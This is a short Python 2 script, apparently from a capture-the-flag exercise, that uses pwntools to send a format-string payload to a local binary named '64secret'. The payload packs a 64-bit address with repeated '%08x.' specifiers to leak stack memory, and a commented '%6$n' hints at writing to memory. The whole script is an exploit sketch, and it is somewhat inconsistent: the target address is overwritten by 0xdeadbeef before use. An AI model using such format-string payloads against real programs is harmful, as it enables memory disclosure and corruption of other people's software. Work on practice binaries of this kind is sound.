#!/usr/bin/python 
from pwn import *
context.log_level = 'debug'
p = process('64secret')
secret = 0x601050
secret = 0xdeadbeef
payload = p64(secret) + "%08x." * 10 #"%6$n"
p.sendline(payload)
print p.read()
#print p.read().split('.')
